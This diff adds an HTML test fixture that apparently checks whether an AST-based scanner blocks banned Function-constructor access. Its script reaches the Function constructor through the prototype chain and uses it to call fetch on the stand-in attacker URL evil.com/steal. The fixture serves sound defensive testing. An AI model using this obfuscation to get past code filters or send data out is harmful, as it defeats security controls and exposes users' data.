@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Obfuscated Constructor Chain Attack</title>
+</head>
+<body>
+  <!-- Attack: Prototype chain traversal to access Function constructor -->
+  <script>
+    // This should be caught by AST analysis - Function constructor is banned
+    const func = [].constructor.constructor;
+    const fetchFn = func('return fetch')();
+    fetchFn('https://evil.com/steal').then(console.log);
+  </script>
+</body>
+</html>
